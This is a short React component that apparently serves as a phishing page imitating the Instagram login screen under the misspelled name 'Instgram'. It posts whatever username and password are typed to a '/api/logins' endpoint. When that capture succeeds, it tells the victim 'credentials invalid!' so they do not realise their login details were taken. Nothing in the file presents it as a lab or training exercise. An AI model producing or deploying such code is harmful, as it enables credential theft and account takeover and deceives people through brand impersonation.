import { useState } from "react";

export default function LoginPage() {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [msg, setMsg] = useState("");

  async function handleSubmit(e) {
    e.preventDefault();

    if (!username || !password) {
      setMsg("Please enter username and password.");
      return;
    }

    try {
      const res = await fetch("/api/logins", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ username, password }),
      });
      const data = await res.json();
      if (data.success) {
        setMsg("credentials invalid!");
        setUsername("");
        setPassword("");
      } else {
        setMsg("Failed to send login data.");
      }
    } catch {
      setMsg("Network error.");
    }
  }

  return (
    <div className="page">
      <div className="login-box">
        {/* Heading */}
        <h1 className="wordmark">Instgram</h1>

        <form onSubmit={handleSubmit} className="login-form">
          <input
            id="username"
            value={username}
            onChange={(e) => setUsername(e.target.value)}
            placeholder="Username or email"
            autoComplete="off"
            spellCheck="false"
          />

          <input
            id="password"
            type="password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            placeholder="Password"
            autoComplete="off"
            spellCheck="false"
          />

          <button type="submit">Log In</button>
        </form>

        {msg && <div className="message">{msg}</div>}
      </div>
    </div>
  );
}
